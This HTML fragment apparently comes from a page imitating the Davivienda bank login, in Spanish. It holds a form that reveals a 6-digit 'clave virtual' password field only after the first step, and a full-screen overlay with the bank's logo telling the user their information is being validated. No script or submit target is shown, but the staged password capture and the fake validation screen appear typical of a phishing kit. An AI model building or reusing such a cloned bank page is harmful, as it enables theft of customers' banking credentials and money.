                                <label for="formAutenticar:remember" style="margin-left: 5px;">Recordar mis datos de identidad</label>
                            </div>
                        </div>

                        <!-- Campo de Clave Virtual (Oculto inicialmente hasta dar continuar) -->
                        <div id="panelClaveVirtual" class="form-field" style="display: none; margin-top: 15px;">
                            <label for="claveVirtualInput">Ingrese su clave virtual</label>
                            <input id="claveVirtualInput" autocomplete="off" maxlength="6" inputmode="numeric" type="password" placeholder="••••••" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px;">
                        </div>

                        <!-- Botón -->
                        <div id="formAutenticar:button-container" class="submit" style="margin-top: 20px;">
                            <input autocomplete="off" autocorrect="off" spellcheck="false" id="formAutenticar:btnSubmitCont" class="btn-red continuar" type="submit" value="Continuar">
                        </div>

                        <div class="form-divider"></div>
                        <div class="form-link-olvido">
                            <a href="#">¿Olvidó su clave?</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>
</div>

<!-- LOADER DE PANTALLA COMPLETA CON LOGO -->
<div id="loadingOverlay" style="position: fixed; inset: 0; z-index: 999999; background-color: #ffffff; display: none; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif;">
    <img src="logo-davivienda.svg" alt="Davivienda" style="width: 140px; margin-bottom: 20px;">
    <div style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #e31937; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
    <p style="color: #333333; font-size: 14px; font-weight: 500; text-align: center; max-width: 280px; line-height: 1.4;">
        Estamos validando tu información. Esto puede tomar algunos segundos...
    </p>
</div>

<style>
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
    </div>
